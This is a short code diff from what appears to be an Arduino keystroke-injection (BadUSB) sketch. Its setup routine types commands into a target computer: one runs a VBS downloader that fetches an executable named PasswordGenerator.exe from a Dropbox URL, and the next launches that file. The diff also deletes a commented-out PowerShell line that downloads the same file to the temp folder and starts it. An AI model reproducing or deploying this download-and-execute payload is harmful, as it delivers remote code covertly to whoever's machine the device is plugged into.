@@ -66,10 +66,7 @@ void setup() {
   typeln("cscript download.vbs https://dl.dropboxusercontent.com/u/60602481/PasswordGenerator.exe");
   
   typeln("PasswordGenerator.exe && exit");
-  
-  
-  //typeln('powershell -noexit new-object System.Net.WebClient.DownloadFile("https://dl.dropboxusercontent.com/u/60602481/PasswordGenerator.exe','%TEMP%\file.exe"); Start-Process "%TEMP%\file.exe"');
-  
+    
 }
 
 void loop() {
